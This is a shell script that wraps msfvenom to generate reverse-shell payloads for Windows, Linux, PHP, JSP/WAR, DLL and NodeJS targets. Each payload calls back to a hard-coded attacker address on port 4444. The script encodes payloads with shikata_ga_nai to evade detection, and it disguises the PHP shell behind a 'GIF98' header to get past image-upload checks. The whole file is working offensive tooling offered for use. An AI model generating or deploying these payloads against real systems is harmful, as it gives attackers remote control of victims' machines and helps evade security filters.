#!/bin/sh

# venome.sh -- script to generate win/lin revshell to 'my Kali box'
#              based on MSF Venom (default install on Kali 2)
#

# 14.08.2018 @ 19:12

# some defines first
KALI=192.168.1.183
KALIPORT=4444
FTYPOUT="py"

####

echo ""
echo "[+] \$\$\$ sh0w m3 th3 m0n3y \$\$\$"
echo ""

echo "  >> choose your destiny (1/2/3):"
echo "      1. goto windows        2. goto linux"
echo "      3. php                 4. war (jsp)"
echo "      5. dll                 6. nodejs"
echo ""
read letsgoto

case "$letsgoto" in
  "1") echo "[+] preparing Windows revshell for Kali ($KALI on port $KALIPORT):"
       msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$KALIPORT EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" > winshell.py 2>&1
       echo "[+] Windows reverse shell should be ready here:"
       ls -la winshell.py
       echo "[+] we're done."

  ;;


  "2") echo "[+] preparing Linux revshell for Kali ($KALI on port $KALIPORT):"
       msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.183 LPORT=4444 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" > linshell.py 2>&1
       echo "[+] Linux reverse shell should be ready here:"
       ls -la linshell.py
       echo "[+] we're done."

   ;;


  "3") echo "[+] preparing PHP revshell for Kali ($KALI on port $KALIPORT):"

       msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.183 LPORT=4444 -f raw >> phpshell-a.php 2>&1
       echo "GIF98" > phpshell.php
       tail -n 2 phpshell-a.php >> phpshell.php
       echo "[+] PHP reverse shell should be ready here:"
       rm phpshell-a.php
       ls -la phpshell.php
       echo "[+] we're done."

   ;;


  "4") echo "[+] preparing WAR (with JSP) revshell for Kali ($KALI on port $KALIPORT):"

       msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.183 LPORT=4444 -f raw > jspshell.war 2>&1
       echo "[+] WAR (JSP) reverse shell should be ready here:"
       ls -la jspshell.war
       echo "[+] we're done."

   ;;

  "5") echo "[+] preparing DLL revshell for Kali ($KALI on port $KALIPORT):"

       msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.183 LPORT=4444 -f dll > h00ker.dll 2>&1
       echo "[+] DLL reverse shell should be ready here:"
       ls -la h00ker.dll
       echo "[+] we're done."
  ;;

  "6") echo "[+] preparing NodeJS revshell for Kali ($KALI on port $KALIPORT):"

       msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.183 LPORT=4444 -f raw > naughty.js 2>&1
       echo "[+] naughty.js reverse shell should be ready here:"
       ls -la naughty.js
       echo "[+] we're done."


   ;;


  *) echo "[-] nononono! :<"
     echo ""

esac # newton

echo "[+] thank you, bye!"
# o/
